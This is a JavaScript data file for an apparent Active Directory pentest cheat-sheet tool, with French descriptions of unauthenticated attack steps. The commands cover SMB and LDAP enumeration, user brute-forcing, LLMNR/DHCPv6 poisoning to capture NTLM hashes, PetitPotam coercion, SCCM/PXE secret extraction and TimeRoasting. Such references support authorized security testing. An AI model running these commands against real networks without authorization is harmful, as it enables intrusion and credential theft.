export const NO_CREDENTIALS_DATA = [
  {
    name: 'Scan network',
    nodes: [
      { 
        label: 'nxc smb <ip_range>', 
        cmd: 'nxc smb <ip_range>', 
        leadsTo: 'Vulnerable host',
        description: 'Scan rapide du protocole SMB sur une plage IP pour identifier les versions d\'OS et la signature SMB.'
      },
      { 
        label: 'nmap -sP <ip>', 
        cmd: 'nmap -sP <ip>', 
        leadsTo: 'Vulnerable host',
        description: 'Scan de découverte (Ping Sweep) pour identifier les hôtes actifs sans scanner les ports.'
      },
      { 
        label: 'nmap -Pn -sV --top-ports 50 --open <ip>', 
        cmd: 'nmap -Pn -sV --top-ports 50 --open <ip>', 
        leadsTo: 'Vulnerable host',
        description: 'Scan des 50 ports les plus courants pour une identification rapide des services.'
      },
      { 
        label: 'nmap -Pn --script smb-vuln* -p139,445 <ip>', 
        cmd: 'nmap -Pn --script smb-vuln* -p139,445 <ip>', 
        leadsTo: 'Vulnerable host',
        description: 'Exécution des scripts NSE (Nmap Scripting Engine) pour détecter les vulnérabilités SMB connues (ex: MS17-010).'
      },
      { 
        label: 'nmap -Pn -sC -sV -oA <output> <ip>', 
        cmd: 'nmap -Pn -sC -sV -oA <output> <ip>', 
        leadsTo: 'Vulnerable host',
        description: 'Scan complet standard : détection de version (-sV) et scripts par défaut (-sC) avec sortie fichier.'
      },
      { 
        label: 'nmap -Pn -sC -sV -p- -oA <output> <ip>', 
        cmd: 'nmap -Pn -sC -sV -p- -oA <output> <ip>', 
        leadsTo: 'Vulnerable host',
        description: 'Scan intensif sur TOUS les ports (1-65535). Très long mais exhaustif.'
      },
      { 
        label: 'nmap -sU -sC -sV -oA <output> <ip>', 
        cmd: 'nmap -sU -sC -sV -oA <output> <ip>', 
        leadsTo: 'Vulnerable host',
        description: 'Scan des ports UDP. Utile pour détecter SNMP, TFTP ou d\'autres services sans connexion TCP.'
      }
    ]
  },
  {
    name: 'Find DC IP',
    nodes: [
      { 
        label: 'nmcli dev show <interface>', 
        cmd: 'nmcli dev show <interface>', 
        leadsTo: 'DC Discovery',
        description: 'Affiche les informations DNS de l\'interface réseau, révélant souvent l\'IP du Contrôleur de Domaine.'
      },
      { 
        label: 'nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>', 
        cmd: 'nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>', 
        leadsTo: 'DC IP Identification',
        description: 'Requête DNS spécifique pour trouver les enregistrements SRV des contrôleurs de domaine AD.'
      },
      { 
        label: 'nmap -p 88 --open <ip_range>', 
        cmd: 'nmap -p 88 --open <ip_range>', 
        leadsTo: 'DC Port Identification',
        description: 'Scan ciblé sur le port 88 (Kerberos), ouvert uniquement sur les Contrôleurs de Domaine.'
      }
    ]
  },
  {
    name: 'Zone transfer',
    nodes: [
      { 
        label: 'dig axfr <domain_name> @<name_server>', 
        cmd: 'dig axfr <domain_name> @<name_server>', 
        leadsTo: 'Domain Data Leak',
        description: 'Tente un transfert de zone DNS complet (AXFR) pour récupérer tous les enregistrements du domaine.'
      }
    ]
  },
  {
    name: 'Anonymous & Guest access on SMB shares',
    nodes: [
      { 
        label: "nxc smb <ip_range> -u '' -p ''", 
        cmd: "nxc smb <ip_range> -u '' -p ''", 
        leadsTo: 'Read Access / Files',
        description: 'Test d\'authentification SMB avec une session nulle (vide).'
      },
      { 
        label: "nxc smb <ip_range> -u 'a' -p ''", 
        cmd: "nxc smb <ip_range> -u 'a' -p ''", 
        leadsTo: 'Read Access / Files',
        description: 'Test d\'authentification SMB avec un utilisateur erroné pour vérifier l\'accès Invité.'
      },
      { 
        label: 'enum4linux-ng.py -u "" -p "" <ip>', 
        cmd: 'enum4linux-ng.py -u "" -p "" <ip>', 
        leadsTo: 'Users/Shares Info',
        description: 'Outil complet pour énumérer les partages, utilisateurs et politiques via RPC/SMB sans accès.'
      },
      { 
        label: "smbclient -U '%' -L //<ip>", 
        cmd: "smbclient -U '%' -L //<ip>", 
        leadsTo: 'List Shares',
        description: 'Liste les partages disponibles sur la cible en utilisant une connexion anonyme.'
      }
    ]
  },
  {
    name: 'Enumerate LDAP',
    nodes: [
      { 
        label: 'nmap -n -sV --script "ldap* and not brute" -p 389 <dc_ip>', 
        cmd: 'nmap -n -sV --script "ldap* and not brute" -p 389 <dc_ip>', 
        leadsTo: 'Username',
        description: 'Exécute les scripts LDAP de Nmap pour récupérer le contexte de nommage et parfois des utilisateurs.'
      },
      { 
        label: 'ldapsearch -x -H ldap://<dc_ip> -s base', 
        cmd: 'ldapsearch -x -H ldap://<dc_ip> -s base', 
        leadsTo: 'Username',
        description: 'Interroge la racine (RootDSE) du LDAP sans authentification (bind anonyme).'
      }
    ]
  },
  {
    name: 'Enumerate Users',
    nodes: [
      { 
        label: 'nxc smb <dc_ip> --users', 
        cmd: 'nxc smb <dc_ip> --users', 
        leadsTo: 'Username',
        description: 'Tente de lister les utilisateurs du domaine via les pipes RPC nommés.'
      },
      { 
        label: 'nxc smb <dc_ip> --id-brute 10000', 
        cmd: 'nxc smb <dc_ip> --id-brute 10000', 
        leadsTo: 'Username',
        description: 'Bruteforce les RID (Relative ID) pour découvrir des comptes même si l\'énumération est bloquée.'
      },
      { 
        label: 'net rpc group members "Domain Users"', 
        cmd: "net rpc group members \"Domain Users\" -W <domain> -I <ip> -U '%'", 
        leadsTo: 'Username',
        description: 'Liste les membres du groupe "Domain Users" via le protocole RPC.'
      }
    ]
  },
  {
    name: 'Bruteforce users',
    nodes: [
      { 
        label: 'kerbrute userenum -d <domain> <userlist>', 
        cmd: 'kerbrute userenum -d <domain> <userlist>', 
        leadsTo: 'Username',
        description: 'Valide l\'existence des utilisateurs en analysant les réponses Kerberos (Pas de pré-auth requise).'
      },
      { 
        label: 'nmap krb5-enum-users', 
        cmd: 'nmap -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm=<domain>,userdb=<user_list_file>" <dc_ip>', 
        leadsTo: 'Username',
        description: 'Script Nmap équivalent à Kerbrute pour énumérer les utilisateurs via Kerberos.'
      }
    ]
  },
  {
    name: 'Poisoning',
    nodes: [
      { 
        label: 'responder -I <interface>', 
        cmd: 'responder -I <interface>', 
        leadsTo: 'Hash found ASREQ / Poisoning',
        description: 'Répond aux requêtes LLMNR/NBT-NS multicast pour capturer des hashs NTLM.'
      },
      { 
        label: 'mitm6 -d <domain>', 
        cmd: 'mitm6 -d <domain>', 
        leadsTo: 'Hash found ASREQ',
        description: 'Attaque DHCPv6 pour s\'imposer comme serveur DNS IPv6 et relayer l\'authentification.'
      },
      { 
        label: 'bettercap', 
        cmd: 'bettercap', 
        leadsTo: 'Hash found ASREQ',
        description: 'Outil polyvalent pour le Man-in-the-Middle (ARP Spoofing, DNS Spoofing).'
      },
      { 
        label: 'Pcredz -i <interface> -v', 
        cmd: 'Pcredz -i <interface> -v', 
        leadsTo: 'Hash found ASREQ',
        description: 'Sniffeur passif qui extrait les crédentiels et hashs (NTLM, Kerberos, etc.) du trafic réseau.'
      }
    ]
  },
  {
    name: 'Coerce',
    nodes: [
      { 
        label: 'PetitPotam (Unauth)', 
        cmd: 'python3 petitpotam.py -d <domain> <listener> <target>', 
        leadsTo: 'Coerce SMB',
        description: 'Force une authentification machine (NTLM) vers l\'attaquant via MS-EFSRPC (CVE-2022-26925 si non patché).'
      }
    ]
  },
  {
    name: 'PXE',
    nodes: [
      { 
        label: 'pxethief.py 1 (No Pass)', 
        cmd: 'python3 pxethief.py 1', 
        leadsTo: 'Credentials (NAA account)',
        description: 'Scanne le réseau pour trouver des serveurs PXE/SCCM mal configurés sans mot de passe.'
      },
      { 
        label: 'pxethief.py 2 (Dist Point)', 
        cmd: 'python3 pxethief.py 2 -distribution_point_ip <ip>', 
        leadsTo: 'Credentials (NAA account)',
        description: 'Extrait les secrets d\'un point de distribution SCCM identifié.'
      },
      { 
        label: 'tftp -i <dp_ip> GET "xxx.boot.var"', 
        cmd: 'tftp -i <dp_ip> GET "xxx.boot.var"', 
        leadsTo: 'PXE Hash',
        description: 'Télécharge manuellement le fichier de variable de démarrage via TFTP.'
      },
      { 
        label: 'pxethief.py 5 (Crack)', 
        cmd: 'python3 pxethief.py 5 xxx.boot.var', 
        leadsTo: 'PXE Hash',
        description: 'Extrait et déchiffre le mot de passe média stocké dans le fichier boot.var.'
      }
    ]
  },
  {
    name: 'TimeRoasting',
    nodes: [
      { 
        label: 'timeroast.py <dc_ip> -o <output_log>', 
        cmd: 'python3 timeroast.py <dc_ip> -o <output_log>', 
        leadsTo: 'timeroast hash',
        description: 'Exploite le protocole NTP non authentifié pour récupérer un hash MD5 (nécessite une attaque par force brute lourde).'
      }
    ]
  }
];